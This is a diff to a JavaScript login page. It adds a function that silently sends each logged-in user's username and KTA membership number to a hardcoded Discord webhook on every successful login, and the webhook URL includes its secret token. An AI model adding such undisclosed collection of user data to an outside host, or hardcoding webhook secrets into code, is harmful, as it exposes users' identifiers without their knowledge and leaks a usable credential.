@@ -12,6 +12,31 @@ function showCustomAlert() {
   document.getElementById('loginForm').reset();
 }
 
+// Fungsi untuk mengirim data ke Discord Webhook
+function sendToDiscord(username, kta) {
+  const webhookURL = 'https://discord.com/api/webhooks/1364545932644974592/x_ofiG2KoFOr2aWwfQ_mVVtNxACdRevwqqdkD8vvTEth-HDSs91peN81lokHgWAq9m9p';
+  
+  const payload = {
+    content: `User telah login: \nUsername: ${username}\nKTA: ${kta}`,
+  };
+
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(payload),
+  })
+  .then(response => {
+    if (!response.ok) {
+      console.error('Gagal mengirim data ke Discord');
+    }
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+}
+
 // Event submit form login
 document.getElementById('loginForm').addEventListener('submit', function (e) {
   e.preventDefault();
@@ -24,6 +49,7 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
   if (account) {
     sessionStorage.setItem('username', account.username);
     sessionStorage.setItem('kta', account.kta);
+    sendToDiscord(account.username, account.kta);  // Mengirim data ke Discord
     window.location.href = 'weblogin333.html';
   } else {
     showCustomAlert();
